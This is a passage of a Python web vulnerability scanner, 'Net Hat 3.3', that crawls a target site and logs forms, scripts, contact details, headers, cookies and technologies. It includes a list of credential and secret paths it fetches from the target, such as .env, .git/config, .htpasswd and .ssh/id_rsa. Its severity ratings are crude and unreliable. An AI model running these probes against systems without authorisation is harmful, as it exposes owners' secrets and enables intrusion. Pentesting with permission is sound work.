#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ███╗   ██╗███████╗████████╗     ██╗  ██╗ █████╗ ████████╗                ║
║   ████╗  ██║██╔════╝╚══██╔══╝     ██║  ██║██╔══██╗╚══██╔══╝                ║
║   ██╔██╗ ██║█████╗     ██║        ███████║███████║   ██║                   ║
║   ██║╚██╗██║██╔══╝     ██║        ██╔══██║██╔══██║   ██║                   ║
║   ██║ ╚████║███████╗   ██║        ██║  ██║██║  ██║   ██║                   ║
║   ╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                   ║
║                                                                              ║
║   ██████╗ ███████╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗ ███████╗██████╗  ██████╗██╗  ██╗
║   ██╔══██╗██╔════╝██║   ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗██╔════╝██║  ██║
║   ██████╔╝█████╗  ██║   ██║    █████╗  ██║     ███████║██╔██╗ ██║██╔██╗ ██║███████╗██████╔╝██║     ███████║
║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝    ██╔══╝  ██║     ██╔══██║██║╚██╗██║██║╚██╗██║╚════██║██╔══██╗██║     ██╔══██║
║   ██║  ██║███████╗ ╚████╔╝     ██║     ╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████║██║  ██║╚██████╗██║  ██║
║   ╚═╝  ╚═╝╚══════╝  ╚═══╝      ╚═╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
║                                                                              ║
║   Version: 3.3                                                               ║
║   Developer: moshta3el                                                       ║
║   Telegram: @JYI_L                                                          ║
║   For Ethical Hacking & Pentesting Only                                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import socket
import re
import json
import os
import sys
import time
import hashlib
import base64
import urllib3
from urllib.parse import urlparse, urljoin, parse_qs
from datetime import datetime
from bs4 import BeautifulSoup
from collections import defaultdict
import argparse
import concurrent.futures
from urllib.robotparser import RobotFileParser
import ssl
import subprocess
import shutil

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# Colors for Terminal Output
# ============================================
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    RED_BG = '\033[41m'
    BLACK = '\033[30m'

# ============================================
# Advanced Scanner - Net Hat 3.3
# ============================================
class NetHatScanner:
    def __init__(self, target_url, max_depth=5, threads=20, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.base_url = target_url.rstrip('/')
        self.max_depth = max_depth
        self.threads = threads
        self.timeout = timeout
        self.visited_urls = set()
        self.all_links = set()
        self.all_forms = []
        self.all_scripts = []
        self.all_images = []
        self.all_files = []
        self.api_endpoints = []
        self.hidden_comments = []
        self.email_addresses = set()
        self.phone_numbers = set()
        self.source_files = []
        self.directories = set()
        self.parameters = set()
        self.js_variables = set()
        self.cookie_attributes = {}
        self.technologies = {}
        self.ssl_info = {}
        self.dns_records = {}
        self.redirects = []
        
        self.results = {
            'tool': 'Net Hat 3.3',
            'developer': 'moshta3el',
            'telegram': '@JYI_L',
            'target': target_url,
            'scan_time': datetime.now().isoformat(),
            'duration_seconds': 0,
            'vulnerabilities': [],
            'open_ports': [],
            'server_info': {},
            'sensitive_files': [],
            'links': [],
            'forms': [],
            'scripts': [],
            'images': [],
            'files': [],
            'api_endpoints': [],
            'hidden_comments': [],
            'emails': [],
            'phones': [],
            'technologies': [],
            'security_headers': {},
            'cookies': [],
            'source_files': [],
            'directories': [],
            'parameters': [],
            'js_variables': [],
            'ssl_info': {},
            'dns_records': {},
            'redirects': [],
            'summary': {
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'info': 0
            },
            'statistics': {
                'total_links': 0,
                'total_forms': 0,
                'total_scripts': 0,
                'total_images': 0,
                'total_files': 0,
                'total_api_endpoints': 0,
                'total_emails': 0,
                'total_phones': 0,
                'total_source_files': 0,
                'total_directories': 0,
                'total_parameters': 0,
                'total_js_variables': 0
            }
        }
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Create reports directory
        self.reports_dir = 'reports'
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
    
    def print_banner(self):
        """Print the hacker banner in red"""
        banner = f"""
{Colors.RED}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                              ║
    ║     ███╗   ██╗███████╗████████╗     ██╗  ██╗ █████╗ ████████╗                ║
    ║     ████╗  ██║██╔════╝╚══██╔══╝     ██║  ██║██╔══██╗╚══██╔══╝                ║
    ║     ██╔██╗ ██║█████╗     ██║        ███████║███████║   ██║                   ║
    ║     ██║╚██╗██║██╔══╝     ██║        ██╔══██║██╔══██║   ██║                   ║
    ║     ██║ ╚████║███████╗   ██║        ██║  ██║██║  ██║   ██║                   ║
    ║     ╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                   ║
    ║                                                                              ║
    ║     ██████╗ ███████╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ ██████╗
    ║     ██╔══██╗██╔════╝██║   ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗██╔════╝
    ║     ██████╔╝█████╗  ██║   ██║    █████╗  ██║     ███████║██╔██╗ ██║██╔██╗ ██║███████╗██████╔╝██║     
    ║     ██╔══██╗██╔══╝  ╚██╗ ██╔╝    ██╔══╝  ██║     ██╔══██║██║╚██╗██║██║╚██╗██║╚════██║██╔══██╗██║     
    ║     ██║  ██║███████╗ ╚████╔╝     ██║     ╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████║██║  ██║╚██████╗
    ║     ╚═╝  ╚═╝╚══════╝  ╚═══╝      ╚═╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝
    ║                                                                              ║
    ║    ╔══════════════════════════════════════════════════════════════════════╗   ║
    ║    ║  Version: 3.3                    Developer: moshta3el               ║   ║
    ║    ║  Telegram: @JYI_L                For Ethical Hacking Only          ║   ║
    ║    ╚══════════════════════════════════════════════════════════════════════╝   ║
    ║                                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)
    
    def print_header(self):
        """Print scan header"""
        print(f"\n{Colors.CYAN}[*] Target: {self.target_url}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Max Depth: {self.max_depth}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Threads: {self.threads}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Timeout: {self.timeout}s{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print("=" * 80)
    
    def normalize_url(self, url):
        """Normalize URL"""
        if not url:
            return None
        if url.startswith('//'):
            url = 'https:' + url
        if not url.startswith(('http://', 'https://')):
            url = urljoin(self.base_url, url)
        parsed = urlparse(url)
        url = parsed.scheme + '://' + parsed.netloc + parsed.path
        if parsed.query:
            url += '?' + parsed.query
        return url
    
    def is_same_domain(self, url):
        """Check if URL belongs to same domain"""
        try:
            parsed1 = urlparse(self.base_url)
            parsed2 = urlparse(url)
            return parsed1.netloc == parsed2.netloc
        except:
            return False
    
    def fetch_page(self, url):
        """Fetch page content"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            return response
        except:
            return None
    
    def crawl(self, url, depth=0):
        """Advanced crawling with deep analysis"""
        if depth > self.max_depth:
            return
        
        url = self.normalize_url(url)
        if not url or url in self.visited_urls:
            return
        
        if not self.is_same_domain(url):
            return
        
        self.visited_urls.add(url)
        self.all_links.add(url)
        self.directories.add('/'.join(url.split('/')[:-1]) + '/')
        
        print(f"{Colors.DIM}[*] Crawling: {url} (Depth: {depth}){Colors.RESET}")
        
        response = self.fetch_page(url)
        if not response:
            return
        
        # Analyze page deeply
        self.analyze_page_deep(url, response)
        
        # Extract links
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # All anchor tags
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'void')):
                full_url = self.normalize_url(href)
                if full_url and self.is_same_domain(full_url):
                    self.all_links.add(full_url)
                    if depth + 1 <= self.max_depth:
                        self.crawl(full_url, depth + 1)
        
        # All forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if action:
                form_url = self.normalize_url(action)
                if form_url and self.is_same_domain(form_url):
                    self.all_links.add(form_url)
                    if depth + 1 <= self.max_depth:
                        self.crawl(form_url, depth + 1)
        
        # All iframes
        for iframe in soup.find_all('iframe', src=True):
            src = iframe.get('src')
            if src:
                iframe_url = self.normalize_url(src)
                if iframe_url and self.is_same_domain(iframe_url):
                    self.all_links.add(iframe_url)
                    if depth + 1 <= self.max_depth:
                        self.crawl(iframe_url, depth + 1)
        
        # All link tags (CSS, etc)
        for link in soup.find_all('link', href=True):
            href = link.get('href')
            if href:
                link_url = self.normalize_url(href)
                if link_url and self.is_same_domain(link_url):
                    self.all_links.add(link_url)
    
    def analyze_page_deep(self, url, response):
        """Deep page analysis - EVERYTHING"""
        soup = BeautifulSoup(response.text, 'html.parser')
        html = response.text
        
        # 1. FORMS - Deep analysis
        self.analyze_forms_deep(url, soup, response)
        
        # 2. SCRIPTS - Extract all JS
        self.analyze_scripts_deep(url, soup, html)
        
        # 3. IMAGES - All images
        self.analyze_images_deep(url, soup)
        
        # 4. FILES - All downloadable files
        self.analyze_files_deep(url, soup, html)
        
        # 5. COMMENTS - Hidden comments
        self.analyze_comments_deep(url, html)
        
        # 6. EMAILS & PHONES
        self.extract_contact_info(html)
        
        # 7. HEADERS - Security headers
        self.analyze_headers_deep(url, response)
        
        # 8. COOKIES - Security analysis
        self.analyze_cookies_deep(url, response)
        
        # 9. SOURCE CODE - Try to get source files
        self.try_get_source_files(url)
        
        # 10. PARAMETERS - Extract all parameters
        self.extract_parameters(url, html)
        
        # 11. JS VARIABLES - Extract from JavaScript
        self.extract_js_variables(html)
        
        # 12. SSL/TLS - Check security
        self.check_ssl_security(url)
        
        # 13. TECHNOLOGIES - Detect
        self.detect_technologies_deep(url, response, soup)
        
        # 14. DIRECTORY LISTING - Check
        self.check_directory_listing(url)
    
    def analyze_forms_deep(self, url, soup, response):
        """Deep form analysis including hidden fields and CSRF"""
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            enctype = form.get('enctype', '')
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                input_value = input_tag.get('value', '')
                input_required = 'required' in input_tag.attrs
                input_placeholder = input_tag.get('placeholder', '')
                input_maxlength = input_tag.get('maxlength', '')
                
                inputs.append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value,
                    'required': input_required,
                    'placeholder': input_placeholder,
                    'maxlength': input_maxlength
                })
                
                # Check for hidden fields
                if input_type == 'hidden':
                    self.results['vulnerabilities'].append({
                        'url': url,
                        'type': 'Hidden Form Field',
                        'severity': 'medium',
                        'description': f'Hidden field detected: {input_name}={input_value}'
                    })
                    self.results['summary']['medium'] += 1
            
            form_info = {
                'url': url,
                'action': self.normalize_url(action) if action else url,
                'method': method,
                'enctype': enctype,
                'inputs': inputs,
                'has_file_upload': any(i['type'] == 'file' for i in inputs),
                'has_password': any(i['type'] == 'password' for i in inputs),
                'has_csrf': any('csrf' in i['name'].lower() or 'token' in i['name'].lower() for i in inputs)
            }
            self.all_forms.append(form_info)
            
            # Check for vulnerabilities
            if method == 'get' and any(i['type'] in ['password', 'email'] for i in inputs):
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': 'GET Form with Sensitive Data',
                    'severity': 'critical',
                    'description': 'Form uses GET method with sensitive data (password/email)'
                })
                self.results['summary']['critical'] += 1
            
            if not action:
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': 'Form Without Action',
                    'severity': 'low',
                    'description': 'Form has no action attribute'
                })
                self.results['summary']['low'] += 1
            
            if 'csrf' not in response.text.lower() and not any('csrf' in i['name'].lower() for i in inputs):
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': 'No CSRF Protection',
                    'severity': 'high',
                    'description': 'Form may be vulnerable to CSRF attacks'
                })
                self.results['summary']['high'] += 1
    
    def analyze_scripts_deep(self, url, soup, html):
        """Deep JavaScript analysis"""
        for script in soup.find_all('script'):
            src = script.get('src', '')
            content = script.string if script.string else ''
            
            script_info = {
                'url': url,
                'src': self.normalize_url(src) if src else None,
                'inline': bool(content),
                'size': len(content) if content else 0
            }
            self.all_scripts.append(script_info)
            
            # Extract API endpoints from JS
            if content:
                # Find URLs in JS
                urls = re.findall(r'["\'](https?://[^\s"\'<>]+)["\']', content)
                for api_url in urls:
                    if self.is_same_domain(api_url):
                        self.api_endpoints.append({
                            'url': api_url,
                            'source': url,
                            'type': 'JavaScript'
                        })
                
                # Find fetch/ajax calls
                fetch_patterns = [
                    r'fetch\s*\(\s*["\']([^"\']+)["\']',
                    r'\.get\s*\(\s*["\']([^"\']+)["\']',
                    r'\.post\s*\(\s*["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
                    r'XMLHttpRequest',
                    r'http\.request'
                ]
                for pattern in fetch_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        if match and not match.startswith(('http://', 'https://')):
                            full_url = self.normalize_url(match)
                            if full_url:
                                self.api_endpoints.append({
                                    'url': full_url,
                                    'source': url,
                                    'type': 'API Call'
                                })
                
                # Find sensitive keywords
                sensitive_keywords = ['password', 'secret', 'key', 'token', 'api_key', 'apikey', 'admin', 'root', 'auth']
                for keyword in sensitive_keywords:
                    if keyword in content.lower():
                        self.results['vulnerabilities'].append({
                            'url': url,
                            'type': 'Sensitive Info in JavaScript',
                            'severity': 'high',
                            'description': f'Keyword "{keyword}" found in JavaScript code'
                        })
                        self.results['summary']['high'] += 1
                        break
    
    def analyze_images_deep(self, url, soup):
        """Deep image analysis"""
        for img in soup.find_all('img'):
            src = img.get('src', '')
            alt = img.get('alt', '')
            title = img.get('title', '')
            srcset = img.get('srcset', '')
            
            img_info = {
                'url': url,
                'src': self.normalize_url(src) if src else None,
                'alt': alt,
                'title': title,
                'srcset': srcset
            }
            self.all_images.append(img_info)
            
            # Check for sensitive info
            if alt and ('password' in alt.lower() or 'secret' in alt.lower() or 'key' in alt.lower()):
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': 'Sensitive Info in Image Alt',
                    'severity': 'low',
                    'description': f'Sensitive info in image alt: {alt}'
                })
                self.results['summary']['low'] += 1
    
    def analyze_files_deep(self, url, soup, html):
        """Deep file analysis"""
        extensions = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', 
                      '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
                      '.xml', '.json', '.csv', '.txt', '.log',
                      '.sql', '.db', '.bak', '.backup', '.old', '.orig',
                      '.py', '.js', '.css', '.html', '.php', '.asp', '.jsp']
        
        # From HTML links
        for link in soup.find_all(['a', 'link'], href=True):
            href = link.get('href', '')
            if href:
                for ext in extensions:
                    if href.lower().endswith(ext):
                        file_info = {
                            'url': url,
                            'file_url': self.normalize_url(href),
                            'extension': ext,
                            'source': 'HTML Link'
                        }
                        self.all_files.append(file_info)
                        break
        
        # From HTML content (direct downloads)
        file_patterns = [
            r'https?://[^\s"\'<>]+\.(pdf|doc|docx|xls|xlsx|zip|rar|7z|tar|gz|sql|db|bak|backup)',
            r'["\']([^"\']+\.(pdf|doc|docx|xls|xlsx|zip|rar|7z|tar|gz|sql|db|bak|backup))["\']'
        ]
        for pattern in file_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                file_url = match[0] if isinstance(match, tuple) else match
                if not file_url.startswith(('http://', 'https://')):
                    file_url = self.normalize_url(file_url)
                if file_url:
                    self.all_files.append({
                        'url': url,
                        'file_url': file_url,
                        'extension': '.' + file_url.split('.')[-1],
                        'source': 'HTML Content'
                    })
        
        # Check for sensitive files
        sensitive_files = [
            '.env', '.env.local', '.env.production', '.env.development',
            '.git/config', '.git/HEAD', 'config.php', 'wp-config.php',
            '.htaccess', '.htpasswd', '.ssh/id_rsa', '.bash_history',
            'composer.json', 'package.json', 'yarn.lock',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml',
            'web.config', 'application.properties', 'application.yml'
        ]
        
        for file in sensitive_files:
            try:
                test_url = self.normalize_url(file)
                response = self.session.get(test_url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 5:
                    self.results['sensitive_files'].append(test_url)
                    self.results['vulnerabilities'].append({
                        'url': test_url,
                        'type': 'Sensitive File Exposure',
                        'severity': 'critical',
                        'description': f'Sensitive file found: {file}'
                    })
                    self.results['summary']['critical'] += 1
                    print(f"{Colors.RED}  🔴 Sensitive file: {test_url}{Colors.RESET}")
            except:
                pass
    
    def analyze_comments_deep(self, url, html):
        """Deep comment analysis"""
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        for comment in comments:
            comment = comment.strip()
            if len(comment) > 10:
                self.hidden_comments.append({
                    'url': url,
                    'comment': comment[:500]
                })
                
                # Check for sensitive info in comments
                sensitive_keywords = [
                    'password', 'secret', 'key', 'token', 'api', 'admin', 'root',
                    'todo', 'fixme', 'bug', 'hack', 'vulnerability', 'exploit',
                    'user', 'username', 'credential', 'auth', 'login'
                ]
                for keyword in sensitive_keywords:
                    if keyword in comment.lower():
                        self.results['vulnerabilities'].append({
                            'url': url,
                            'type': 'Sensitive Info in HTML Comment',
                            'severity': 'medium',
                            'description': f'Sensitive info in comment: {comment[:100]}...'
                        })
                        self.results['summary']['medium'] += 1
                        break
    
    def extract_contact_info(self, html):
        """Extract emails and phone numbers"""
        # Emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html)
        for email in emails:
            self.email_addresses.add(email)
            self.results['emails'].append(email)
            if email not in ['example@example.com', 'test@test.com']:
                self.results['vulnerabilities'].append({
                    'url': self.target_url,
                    'type': 'Email Disclosure',
                    'severity': 'info',
                    'description': f'Email address found: {email}'
                })
                self.results['summary']['info'] += 1
        
        # Phones
        phones = re.findall(r'(\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9})', html)
        for phone in phones:
            if len(phone) > 8:
                self.phone_numbers.add(phone)
                self.results['phones'].append(phone)
    
    def analyze_headers_deep(self, url, response):
        """Deep headers analysis"""
        headers = response.headers
        
        security_headers = {
            'X-Frame-Options': 'Clickjacking Protection',
            'X-Content-Type-Options': 'MIME Sniffing Protection',
            'Content-Security-Policy': 'XSS Protection',
            'X-XSS-Protection': 'XSS Protection (Legacy)',
            'Strict-Transport-Security': 'HSTS',
            'Referrer-Policy': 'Referrer Policy',
            'Permissions-Policy': 'Permissions Policy',
            'Cross-Origin-Opener-Policy': 'COOP',
            'Cross-Origin-Resource-Policy': 'CORP'
        }
        
        for header, desc in security_headers.items():
            if header in headers:
                self.results['security_headers'][header] = headers[header]
            else:
                severity = 'high' if header in ['X-Frame-Options', 'Content-Security-Policy'] else 'medium'
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': f'Missing Security Header: {header}',
                    'severity': severity,
                    'description': f'{desc} header missing'
                })
                self.results['summary'][severity] += 1
    
    def analyze_cookies_deep(self, url, response):
        """Deep cookies analysis"""
        if 'Set-Cookie' in response.headers:
            cookies = response.headers['Set-Cookie'].split(',')
            for cookie in cookies:
                cookie_info = {'url': url, 'cookie': cookie.strip()}
                self.results['cookies'].append(cookie_info)
                
                # Check security flags
                if 'Secure' not in cookie:
                    self.results['vulnerabilities'].append({
                        'url': url,
                        'type': 'Insecure Cookie',
                        'severity': 'high',
                        'description': 'Cookie missing Secure flag'
                    })
                    self.results['summary']['high'] += 1
                
                if 'HttpOnly' not in cookie:
                    self.results['vulnerabilities'].append({
                        'url': url,
                        'type': 'Insecure Cookie',
                        'severity': 'medium',
                        'description': 'Cookie missing HttpOnly flag'
                    })
                    self.results['summary']['medium'] += 1
                
                if 'SameSite' not in cookie:
                    self.results['vulnerabilities'].append({
                        'url': url,
                        'type': 'Insecure Cookie',
                        'severity': 'low',
                        'description': 'Cookie missing SameSite attribute'
                    })
                    self.results['summary']['low'] += 1
                
                # Extract cookie name for JS variables
                cookie_name = re.search(r'([^=;]+)=', cookie)
                if cookie_name:
                    self.cookie_attributes[cookie_name.group(1)] = cookie
    
    def try_get_source_files(self, url):
        """Try to get source code files"""
        source_extensions = ['.php', '.js', '.css', '.html', '.txt', '.json', '.xml']
        base_url = url.split('?')[0]
        
        for ext in source_extensions:
            if not base_url.endswith(ext):
                test_url = base_url + ext
                try:
                    response = self.session.get(test_url, timeout=3, verify=False)
                    if response.status_code == 200 and len(response.text) > 100:
                        source_info = {
                            'url': test_url,
                            'extension': ext,
                            'size': len(response.text),
                            'content_preview': response.text[:500]
                        }
                        self.source_files.append(source_info)
                        self.results['source_files'].append(source_info)
                        
                        print(f"{Colors.CYAN}  📄 Source code found: {test_url}{Colors.RESET}")
                except:
                    pass
        
        # Try common source file names
        source_names = ['index', 'main', 'app', 'config', 'database', 'functions', 'utils', 'helpers', 'core']
        for name in source_names:
            test_url = self.normalize_url(name + '.php')
            try:
                response = self.session.get(test_url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 100:
                    source_info = {
                        'url': test_url,
                        'extension': '.php',
                        'size': len(response.text),
                        'content_preview': response.text[:500]
                    }
                    self.source_files.append(source_info)
                    self.results['source_files'].append(source_info)
                    print(f"{Colors.CYAN}  📄 Source file: {test_url}{Colors.RESET}")
            except:
                pass
    
    def extract_parameters(self, url, html):
        """Extract all parameters from URLs and HTML"""
        # From URL
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param, values in params.items():
                self.parameters.add(param)
                self.results['parameters'].append(param)
        
        # From HTML
        param_patterns = [
            r'name=["\']([^"\']+)["\']',
            r'id=["\']([^"\']+)["\']',
            r'param=["\']([^"\']+)["\']',
            r'data-([a-zA-Z-]+)=["\'][^"\']+["\']'
        ]
        for pattern in param_patterns:
            matches = re.findall(pattern, html)
            for match in matches:
                self.parameters.add(match)
    
    def extract_js_variables(self, html):
        """Extract JavaScript variables and functions"""
        # Find var/let/const declarations
        patterns = [
            r'(?:var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=',
            r'function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*function'
        ]
        
        js_code = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for code in js_code:
            for pattern in patterns:
                matches = re.findall(pattern, code)
                for match in matches:
                    self.js_variables.add(match)
                    self.results['js_variables'].append(match)
    
    def check_ssl_security(self, url):
        """Check SSL/TLS security"""
        try:
            parsed = urlparse(url)
            if parsed.scheme != 'https':
                self.results['vulnerabilities'].append({
                    'url': url,
                    'type': 'No HTTPS',
                    'severity': 'critical',
                    'description': 'Website does not use HTTPS'
                })
                self.results['summary']['critical'] += 1
                return
            
            host = parsed.netloc.split(':')[0]
            context = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    self.ssl_info = cert
                    self.results['ssl_info'] = cert
                    
                    # Check expiry
                    if 'notAfter' in cert:
                        from datetime import datetime
                        expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if expire_date < datetime.now():
                            self.results['vulnerabilities'].append({
                                'url': url,
                                'type': 'Expired SSL Certificate',
                                'severity': 'critical',
                                'description': 'SSL certificate is expired'
                            })
                            self.results['summary']['critical'] += 1
                    
                    # Check issuer
                    if 'issuer' in cert:
                        issuer = cert['issuer']
                        if 'Let\'s Encrypt' in str(issuer):
                            print(f"{Colors.GREEN}  ✅ SSL: Let's Encrypt (Valid){Colors.RESET}")
                        elif 'COMODO' in str(issuer) or 'Sectigo' in str(issuer):
                            print(f"{Colors.GREEN}  ✅ SSL: COMODO/Sectigo (Valid){Colors.RESET}")
                        else:
                            print(f"{Colors.YELLOW}  ⚠️ SSL Issuer: {issuer}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.YELLOW}  ⚠️ SSL check failed: {e}{Colors.RESET}")
    
    def detect_technologies_deep(self, url, response, soup):
        """Deep technology detection"""
        technologies = set()
        html = response.text
        headers = response.headers
        
        # Server
        if 'Server' in headers:
            technologies.add(f"Server: {headers['Server']}")
        
        # Powered By
        if 'X-Powered-By' in headers:
            technologies.add(f"Powered By: {headers['X-Powered-By']}")
        
        # HTML Meta
        meta_generator = soup.find('meta', {'name': 'generator'})
        if meta_generator and meta_generator.get('content'):
            technologies.add(f"Generator: {meta_generator.get('content')}")
        
        meta_framework = soup.find('meta', {'name': 'framework'})
        if meta_framework and meta_framework.get('content'):
            technologies.add(f"Framework: {meta_framework.get('content')}")
        
        # JavaScript Frameworks
        js_frameworks = {
            'react': 'React',
            'vue': 'Vue.js',
            'angular': 'Angular',
            'jquery': 'jQuery',
            'bootstrap': 'Bootstrap',
            'tailwind': 'Tailwind CSS',
            'next': 'Next.js',
            'nuxt': 'Nuxt.js',
            'svelte': 'Svelte',
            'ember': 'Ember.js',
            'backbone': 'Backbone.js'
        }
        
        for keyword, name in js_frameworks.items():
            if keyword in html.lower():
                technologies.add(f"JavaScript Framework: {name}")
        
        # CMS
        cms_patterns = {
            'wp-content': 'WordPress',
            'wp-includes': 'WordPress',
            'joomla': 'Joomla',
            'drupal': 'Drupal',
            'typo3': 'TYPO3',
            'prestashop': 'PrestaShop',
            'magento': 'Magento',
            'shopify': 'Shopify',
            'wix': 'Wix',
            'webflow': 'Webflow',
            'squarespace': 'Squarespace'
        }
        
        for pattern, name in cms_patterns.items():
            if pattern in html.lower():
                technologies.add(f"CMS: {name}")
        
        # Web Servers
        web_servers = {
            'nginx': 'Nginx',
            'apache': 'Apache',
            'iis': 'IIS',
            'caddy': 'Caddy',
            'lighttpd': 'Lighttpd',
            'tomcat': 'Tomcat',
            'jetty': 'Jetty'
        }
        
        for pattern, name in web_servers.items():
            if pattern in html.lower() or pattern in headers.get('Server', '').lower():
                technologies.add(f"Web Server: {name}")
        
        # Databases
        db_patterns = {
            'mysql': 'MySQL',
            'postgresql': 'PostgreSQL',
            'mongodb': 'MongoDB',
            'sqlite': 'SQLite',
            'oracle': 'Oracle',
            'microsoft sql': 'Microsoft SQL Server',
            'redis': 'Redis',
            'elasticsearch': 'Elasticsearch'
        }
        
        for pattern, name in db_patterns.items():
            if pattern in html.lower():
                technologies.add(f"Database: {name}")
        
        # JavaScript Libraries
        js_libs = [
            ('jquery', 'jQuery'),
            ('bootstrap', 'Bootstrap'),
            ('react', 'React'),
            ('vue', 'Vue.js'),
            ('angular', 'Angular'),
            ('moment', 'Moment.js'),
            ('lodash', 'Lodash'),
            ('d3', 'D3.js'),
            ('three', 'Three.js'),
            ('chart', 'Chart.js'),
            ('swiper', 'Swiper'),
            ('slick', 'Slick Carousel')
        ]
        
        for pattern, name in js_libs:
            if pattern in html.lower():
                technologies.add(f"JavaScript Library: {name}")
        
        self.technologies = technologies
        self.results['technologies'] = list(technologies)
    
    def check_directory_listing(self, url):
        """Check for directory listing vulnerabilities"""
        common_dirs = [
            'images/', 'img/', 'assets/', 'static/', 'media/',
            'uploads/', 'files/', 'documents/', 'download/',
            'css/', 'js/', 'javascript/', 'scripts/',
            'backup/', 'temp/', 'tmp/', 'cache/',
            'logs/', 'log/', 'error_logs/',
            'admin/', 'admin/images/', 'admin/css/', 'admin/js/',
            'wp-content/uploads/', 'wp-content/themes/', 'wp-content/plugins/'
        ]
        
        for dir_path in common_dirs:
            try:
                test_url = self.normalize_url(dir_path)
                response = self.session.get(test_url, timeout=3, verify=False)
                if response.status_code == 200:
                    if 'Index of' in response.text or 'Directory listing' in response.text:
                        self.results['vulnerabilities'].append({
                            'url': test_url,
                            'type': 'Directory Listing',
                            'severity': 'medium',
                            'description': f'Directory listing enabled: {dir_path}'
                        })
                        self.results['summary']['medium'] += 1
                        print(f"{Colors.YELLOW}  📂 Directory listing: {test_url}{Colors.RESET}")
            except:
                pass
    
    def test_sql_injection_advanced(self):
        """Advanced SQL Injection testing with many payloads"""
        print(f"\n{Colors.BLUE}[+] Testing SQL Injection...{Colors.RESET}")
        
        links_with_params = []
        for link in self.all_links:
            if '?' in link and '=' in link:
                links_with_params.append(link)
        
        if not links_with_params:
